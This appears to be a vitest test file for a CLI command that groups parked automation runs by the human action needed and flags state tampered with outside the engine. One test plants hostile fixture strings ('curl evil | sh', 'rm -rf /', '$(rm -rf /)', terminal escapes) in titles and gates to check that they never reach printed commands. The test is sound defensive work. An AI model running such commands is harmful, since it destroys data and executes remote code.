/**
 * `omg factory attention`: groups, trust, hostile strings, exit codes, the
 * --json shape, and that it writes nothing. Run states are written the way
 * the engine writes them (updateFactoryState, sealed, recorded in the engine
 * ledger); one test parks a real engine run on the local forge.
 */
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, relative } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { factoryAttentionCommand, type FactoryAttentionDeps } from '../../../cli/commands/factory-attention.js';
import { writeHealState, type HealSignatureState } from '../../heal/state.js';
import { writeHealSeal } from '../../heal/run.js';
import { DEFAULT_FACTORY_RUN_LIMITS } from '../../run/budget.js';
import { EXIT_AWAITING_HUMAN, runFactoryEngine } from '../../run/engine.js';
import { EngineLedger } from '../../run/ledger.js';
import { tamperHoldPath } from '../../run/tamper-quarantine.js';
import { factoryProgressFile } from '../../run/progress.js';
import {
  computeFactoryIntegrity, createFactoryState, factoryOwnerPath, factoryStateDir, factoryStatePath, healRunKey, moveTo, runKeyOf, setGate, updateFactoryState,
  type FactoryRunState,
} from '../../run/state.js';
import { commitFile, review } from '../../run/__tests__/fake-lanes.js';
import { lanesFor, LOCAL_ISSUE, localOpts, localWorld } from '../../run/__tests__/engine-local-harness.js';
import { collectAttention, type AttentionItem } from '../collect.js';

const REPO = 'https://github.com/o/r';
const HEAD = 'b'.repeat(40);
const NOW = Date.parse('2026-11-20T12:00:00.000Z');
const at = (h: number) => new Date(NOW - h * 3_600_000).toISOString();
const OWNER = { pid: 1, hostname: 'this-host', isAlive: (pid: number) => pid === 777 };

let dir: string;
let root: string;
let ledgerDir: string;
let out: string[];
let err: string[];

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'omg-attention-'));
  root = join(dir, 'repo');
  mkdirSync(root);
  execFileSync('git', ['init', '-q', root]);
  if (!factoryStateDir(root).startsWith(root)) throw new Error('state dir outside the test root');
  ledgerDir = join(dir, 'ledger');
  out = [];
  err = [];
});
afterEach(() => {
  process.exitCode = 0;
  rmSync(dir, { recursive: true, force: true });
});

const issueRun = (issue: number, title = `item ${issue}`, created = at(48)): FactoryRunState =>
  ({ ...createFactoryState({ issue, repoUrl: REPO, base: 'dev' }, created), forgeKind: 'github' as const, issueTitle: title });

/** Written as the engine writes: sealed, and recorded in the engine ledger. */
function asEngine(s: FactoryRunState): void {
  const key = runKeyOf(s);
  const l = EngineLedger.open(ledgerDir, root, key);
  updateFactoryState(root, key, () => s, { onWrite: (p, c) => l.record(p, c) });
}

/** A park at `gate` `hours` ago, from implement. */
function parked(issue: number, gate: string, hours: number, extra: Partial<FactoryRunState> = {}, reason = `parked at ${gate}`): FactoryRunState {
  const s = moveTo(issueRun(issue), 'implement', 'plan ok', at(hours + 1));
  return { ...setGate({ ...s, ...extra }, gate, reason, at(hours)) };
}

function deps(over: Partial<FactoryAttentionDeps> = {}): FactoryAttentionDeps {
  return { root: () => root, out: (l) => out.push(l), err: (l) => err.push(l), ledgerDir, now: () => NOW, owner: OWNER, limits: () => ({ limits: { ...DEFAULT_FACTORY_RUN_LIMITS, maxRunCredits: 200 }, warnings: [] }), ...over };
}

async function attention(args: string[] = [], over: Partial<FactoryAttentionDeps> = {}): Promise<number> {
  process.exitCode = 0;
  try {
    await factoryAttentionCommand(deps(over)).parseAsync(args, { from: 'user' });
  } catch (error) {
    if ((error as { exitCode?: number }).exitCode !== undefined) return (error as { exitCode: number }).exitCode;
    throw error;
  }
  return Number(process.exitCode ?? 0);
}

const json = () => JSON.parse(out.join('\n')) as { schemaVersion: number; summary: { byGroup: Record<string, number>; engines: { live: number; runs: string[] } }; items: Array<Omit<AttentionItem, 'at'>>; warnings: string[]; forge: string | null; repo: string; generatedAt: string };
const item = (key: string) => json().items.find((i) => i.key === key)!;
const argvs = (i: { next: Array<{ argv: string[] }> }) => i.next.map((n) => n.argv.join(' '));

function seedGroups(): void {
  asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
  asEngine(parked(2, 'budget', 5, { lanes: [{ id: 'l1', kind: 'implement', jobId: 'j1', startSha: HEAD, status: 'completed', maxCredits: 30, startedAt: at(6), usage: { credits: 185.5, premiumRequests: 3, source: 'measured' } } as FactoryRunState['lanes'][number]] }));
  asEngine(parked(3, 'lane-tampered', 1));
  asEngine(parked(4, 'gate-definition-changed', 2, { forgeKind: 'local', remote: 'omg-local' }));
  asEngine(parked(5, 'fix-failed', 10));
  asEngine(parked(6, 'fix-failed', 20));
  asEngine(moveTo(issueRun(7), 'implement', 'plan ok', at(30))); // no gate, no owner: broken
  asEngine(parked(8, 'some-future-gate', 4));
  asEngine({ ...moveTo(issueRun(9), 'merged', 'merged', at(2)) }); // terminal: nothing to do
}

describe('omg factory attention', () => {
  it('groups the parks by the human action, oldest first, with the table\'s commands', async () => {
    seedGroups();
    expect(await attention(['--json'])).toBe(EXIT_AWAITING_HUMAN);
    const j = json();
    expect(j.items.map((i) => [i.key, i.group])).toEqual([
      ['#3', 'inspect'], ['#7', 'broken'], ['#4', 'decide'], ['#1', 'merge'], ['#6', 'fix'], ['#5', 'fix'], ['#8', 'fix'], ['#2', 'limits'],
    ]);
    expect(j.summary.byGroup).toEqual({ inspect: 1, broken: 1, decide: 1, merge: 1, fix: 3, limits: 1 });
    expect(j.summary.engines).toEqual({ live: 0, runs: [] });
    expect(j.forge).toBe('mixed');
    expect(argvs(item('#1'))).toEqual([`gh pr merge 11 --admin --merge --match-head-commit ${HEAD}`, 'omg factory run 1', 'omg factory run status 1']);
    expect(argvs(item('#4'))).toEqual(['omg factory run status 4', 'omg factory run 4 --allow-gate-change', 'omg factory run cancel 4']);
    expect(argvs(item('#8'))).toEqual(['omg factory run 8', 'omg factory run status 8']);
    expect(item('#2')).toMatchObject({ credits: 185.5, cap: 200, ageMs: 5 * 3_600_000, gate: 'budget', trust: 'ok' });
    expect(item('#2').notes.join(' ')).toMatch(/within one lane minimum/);
    expect(item('#7').why).toMatch(/no engine holds it/);
    // The list's why is the table's text, never the run's reason; --json carries the reason.
    expect(item('#5').why).not.toContain('parked at');
    expect(item('#5').reason).toBe('parked at fix-failed');
  });

  it('prints a summary, groups in order, and a copyable command per step', async () => {
    seedGroups();
    expect(await attention([], {})).toBe(EXIT_AWAITING_HUMAN);
    const text = out.join('\n');
    expect(text).toContain('8 items need you: inspect 1, broken engine 1, decide 1, merge 1, fix by hand 3, limits / retry 1; no engine running');
    const order = ['INSPECT', 'BROKEN ENGINE', 'DECIDE', 'MERGE', 'FIX BY HAND', 'LIMITS / RETRY'].map((h) => text.indexOf(h));
    expect(order.every((v, i) => v >= 0 && (i === 0 || v > order[i - 1]))).toBe(true);
    expect(text).toContain(`$ gh pr merge 11 --admin --merge --match-head-commit ${HEAD}`);
    expect(text).not.toContain('reason: parked at');
    out = [];
    await attention(['--verbose']);
    expect(out.join('\n')).toContain('reason: parked at fix-failed');
  });

  it('exit codes: 0 when nothing needs you, 4, 0 with --exit-zero, 1 on an unreadable state, 2 on usage', async () => {
    expect(await attention()).toBe(0);
    expect(out.join('\n')).toContain('nothing needs you; no engine running');
    asEngine(parked(1, 'merge', 1, { phase: 'merge', pr: 2, head: HEAD }));
    expect(await attention()).toBe(EXIT_AWAITING_HUMAN);
    expect(EXIT_AWAITING_HUMAN).toBe(4);
    expect(await attention(['--exit-zero'])).toBe(0);
    writeFileSync(factoryStatePath(root, 2), '{ not json');
    expect(await attention(['--exit-zero'])).toBe(1);
    out = [];
    expect(await attention(['--json'])).toBe(1);
    expect(item('#2')).toMatchObject({ group: 'inspect', trust: 'unreadable', next: [{ argv: ['omg', 'factory', 'run', 'status', '2'] }] });
    expect(await attention(['--bogus'])).toBe(2);
    expect(await attention([], { root: () => { throw new Error('not a repo'); } })).toBe(2);
  });

  it('--json has the schema', async () => {
    asEngine(parked(1, 'merge', 1, { phase: 'merge', pr: 2, head: HEAD }));
    await attention(['--json']);
    const j = json();
    expect(Object.keys(j)).toEqual(['schemaVersion', 'repo', 'forge', 'generatedAt', 'summary', 'items', 'warnings']);
    expect(j).toMatchObject({ schemaVersion: 1, repo: root, forge: 'github', generatedAt: new Date(NOW).toISOString() });
    for (const k of ['key', 'group', 'gate', 'phase', 'ageMs', 'credits', 'cap', 'pr', 'head', 'title', 'why', 'next', 'trust']) expect(j.items[0], k).toHaveProperty(k);
    expect(j.items[0]).not.toHaveProperty('at');
    for (const n of j.items[0].next) expect(Array.isArray(n.argv) && n.argv.every((a) => typeof a === 'string')).toBe(true);
  });

  it('a state edited after the engine sealed it, or not the engine\'s last write, lands in Inspect with only the status command', async () => {
    asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD }));
    asEngine(parked(2, 'merge', 3, { phase: 'merge', pr: 12, head: HEAD }));
    asEngine(moveTo(issueRun(3), 'merged', 'done', at(1)));
    // #1: the seal no longer matches (a hand edit of the head).
    const p1 = factoryStatePath(root, 1);
    writeFileSync(p1, readFileSync(p1, 'utf8').replace(HEAD, 'd'.repeat(40)));
    // #2: a valid seal, but not the bytes the engine ledger recorded (written outside the engine).
    const s2 = JSON.parse(readFileSync(factoryStatePath(root, 2), 'utf8')) as FactoryRunState;
    const forged = { ...s2, head: 'e'.repeat(40), integrity: undefined };
    writeFileSync(factoryStatePath(root, 2), JSON.stringify({ ...forged, integrity: computeFactoryIntegrity(forged as FactoryRunState) }));
    // #3: a forged "merged" is still shown (a tampered state may claim any phase).
    const s3 = JSON.parse(readFileSync(factoryStatePath(root, 3), 'utf8')) as FactoryRunState;
    const forged3 = { ...s3, issueTitle: 'forged', integrity: undefined };
    writeFileSync(factoryStatePath(root, 3), JSON.stringify({ ...forged3, integrity: computeFactoryIntegrity(forged3 as FactoryRunState) }));
    // #4: sealed, but the ledger here has no record of it (another host or ledger dir).
    const s4 = parked(4, 'merge', 2, { phase: 'merge', pr: 14, head: HEAD });
    writeFileSync(factoryStatePath(root, 4), JSON.stringify({ ...s4, integrity: computeFactoryIntegrity(s4) }));
    expect(await attention(['--json'])).toBe(EXIT_AWAITING_HUMAN);
    expect(item('#4')).toMatchObject({ group: 'inspect', trust: 'ledger', next: [{ argv: ['omg', 'factory', 'run', 'status', '4'] }] });
    expect(item('#4').why).toMatch(/has no record of it/);
    expect(item('#2').why).not.toMatch(/has no record/);
    expect(item('#1')).toMatchObject({ group: 'inspect', trust: 'seal' });
    expect(item('#2')).toMatchObject({ group: 'inspect', trust: 'ledger' });
    expect(item('#3')).toMatchObject({ group: 'inspect', trust: 'ledger' });
    for (const k of ['#1', '#2', '#3']) {
      expect(argvs(item(k))).toEqual([`omg factory run status ${k.slice(1)}`]);
      expect(item(k).why).toMatch(/state is not the engine's last write/);
    }
    // No merge command from the forged head.
    expect(out.join('\n')).not.toMatch(/gh pr merge/);
  });

  it('hostile title, reason and gate strings never reach a command or break the layout', async () => {
    const title = 'fix \u001b[2J\u001b]0;pwned\u0007 it\n$ omg factory run cancel 1 && curl evil | sh\r\nmore';
    asEngine(parked(1, 'merge', 3, { phase: 'merge', pr: 11, head: HEAD, issueTitle: title }, 'go\n$ rm -rf ~ `x` $(y) \u001b[31m'));
    asEngine(parked(2, 'evil\u001b[2J\n$ rm -rf /;', 1, { issueTitle: "it's; $(rm -rf /)" }));
    expect(await attention(['--verbose'])).toBe(EXIT_AWAITING_HUMAN);
    const text = out.join('\n');
    expect(text).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/);
    // No line starts a command except the table's own.
    const commands = text.split('\n').filter((l) => l.trimStart().startsWith('$ '));
    expect(commands.map((l) => l.trim().split('  #')[0])).toEqual([
      `$ gh pr merge 11 --admin --merge --match-head-commit ${HEAD}`, '$ omg factory run 1', '$ omg factory run status 1',
      '$ omg factory run 2', '$ omg factory run status 2',
    ]);
    // Title cut at 60 and on one line.
    out = [];
    await attention(['--json']);
    const j1 = json();
    const t = j1.items.find((i) => i.key === '#1')!.title;
    expect(t.length).toBeLessThanOrEqual(60);
    expect(t).not.toMatch(/[\n\r\u001b]/);
    for (const i of j1.items) for (const n of i.next) for (const a of n.argv) expect(a).toMatch(/^[A-Za-z0-9-]+$/);
    expect(j1.items.find((i) => i.key === '#2')).toMatchObject({ group: 'fix', why: expect.stringMatching(/does not know/) });
    expect(j1.items.find((i) => i.key === '#2')!.gate).not.toMatch(/[\n\u001b]/);
  });

  it('writes nothing, while an engine holds a run (live owner file)', async () => {
    seedGroups();
    asEngine(moveTo(issueRun(20), 'implement', 'plan ok', at(1)));
    writeFileSync(factoryOwnerPath(root, 20), JSON.stringify({ pid: 777, hostname: 'this-host', startedAt: at(1) }));
    const log = factoryProgressFile(root, 20);
    mkdirSync(dirname(log), { recursive: true });
    writeFileSync(log, '{}\n');
    utimesSync(log, new Date(NOW - 60_000), new Date(NOW - 60_000));
    const snap = () => [root, ledgerDir].flatMap((d) => walk(d).map((p) => `${relative(dir, p)} ${statSync(p).mtimeMs} ${hash(p)}`)).sort();
    const before = snap();
    expect(await attention(['--json'])).toBe(EXIT_AWAITING_HUMAN);
    await attention([]);
    expect(snap()).toEqual(before);
    // A live, fresh engine needs nobody.
    out = [];
    await attention(['--json']);
    expect(json().summary.engines).toEqual({ live: 1, runs: ['#20'] });
    expect(json().items.find((i) => i.key === '#20')).toBeUndefined();
    // Quiet for 10+ minutes: "possibly hung", a hint with the status command only.
    utimesSync(log, new Date(NOW - 11 * 60_000), new Date(NOW - 11 * 60_000));
    out = [];
    await attention(['--json']);
    expect(item('#20')).toMatchObject({ group: 'broken', next: [{ argv: ['omg', 'factory', 'run', 'status', '20'] }] });
    expect(item('#20').notes.join(' ')).toMatch(/possibly hung/);
    expect(snap().filter((l) => !l.includes('factory-20.log'))).toEqual(before.filter((l) => !l.includes('factory-20.log')));
  });

  it('heal runs: a parked ci-heal run uses the heal commands, and a sealed heal signature waiting for approval is listed', async () => {
    const key = healRunKey('0123abcd');
    const heal = { ...createFactoryState({ issue: 0, repoUrl: REPO, base: 'dev', heal: { sig8: '0123abcd', class: 'test-failure', firstRed: { runId: '1', sha: HEAD }, failingTests: [], env: [], diagnosis: { class: 'test-failure', rootCause: 'x', evidence: [], reproduced: false, fix: null } } as never }, at(10)) };
    asEngine(setGate(moveTo(heal, 'plan', 'plan', at(9)), 'gates-unsandboxed', 'why', at(8)));
    expect(runKeyOf(heal)).toBe(key);
    const sig: HealSignatureState = {
      version: 1, sig8: 'fedcba98', signature: 's', class: 'regression', classification: {} as never, source: 'push',
      firstSeen: { runId: '1', at: at(5) }, lastSeen: { runId: '1', at: at(5) }, count: 1, seenRuns: ['1'],
      healRun: { id: 'h', open: true, startedAt: at(5) }, next: 'heal-approve', rerunIntents: [], updatedAt: at(4),
    };
    writeHealState(root, sig);
    writeHealSeal(ledgerDir, root, sig);
    writeHealState(root, { ...sig, sig8: '00000001', healRun: { id: 'h2', open: true, startedAt: at(3) } }); // no seal
    await attention(['--json']);
    // The flag step is dropped: heal approve takes no --allow-unsandboxed-gates.
    expect(argvs(item(String(key)))).toEqual(['omg factory heal status 0123abcd', 'omg factory heal cancel 0123abcd']);
    expect(item('heal-fedcba98')).toMatchObject({ group: 'decide', gate: 'heal-approve', trust: 'ok', title: 'ci-heal regression' });
    expect(argvs(item('heal-fedcba98'))).toEqual(['omg factory heal status fedcba98', 'omg factory heal approve fedcba98', 'omg factory heal close fedcba98']);
    expect(item('heal-00000001')).toMatchObject({ group: 'inspect', trust: 'seal' });
    expect(argvs(item('heal-00000001'))).toEqual(['omg factory heal status 00000001']);
  });

  it('a tamper hold is one Inspect item naming the release command', () => {
    expect(collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER }).items).toEqual([]);
    const hold = tamperHoldPath(ledgerDir, root);
    mkdirSync(dirname(hold), { recursive: true });
    writeFileSync(hold, '{ unreadable');
    const d = collectAttention(root, { ledgerDir, now: () => NOW, owner: OWNER });
    expect(d.items.map((i) => [i.key, i.group, i.gate, i.next.map((n) => n.argv.join(' '))])).toEqual([['checkout', 'inspect', 'tamper-hold', ['omg factory run release --tamper']]]);
  });

  it('the merge command matches the one a real local-forge engine run prints at its merge park', async () => {
    const w = localWorld();
    try {
      const lanes = lanesFor(w, [commitFile('src/greet.js', 'export const greet = () => "hi";\n'), review('approve')]);
      const outcome = await runFactoryEngine(localOpts(w, lanes));
      expect(outcome.gate?.name).toBe('merge');
      const d = collectAttention(w.root, { ledgerDir: w.ledgerDir, now: () => Date.now(), owner: OWNER, limits: null });
      const row = d.items.find((i) => i.key === `#${LOCAL_ISSUE}`)!;
      expect(row).toMatchObject({ group: 'merge', trust: 'ok', gate: 'merge' });
      expect(row.next[0].argv.join(' ')).toBe(outcome.mergeCommand);
      expect(row.next[1].argv).toEqual(['omg', 'factory', 'run', String(LOCAL_ISSUE)]);
      expect(d.forge).toBe('local');
    } finally {
      rmSync(w.dir, { recursive: true, force: true });
    }
  });
});

function walk(d: string): string[] {
  if (!existsSync(d)) return [];
  return readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? (e.name === '.git' ? [] : walk(join(d, e.name))) : [join(d, e.name)]));
}
const hash = (p: string) => createHash('sha256').update(readFileSync(p)).digest('hex').slice(0, 16);
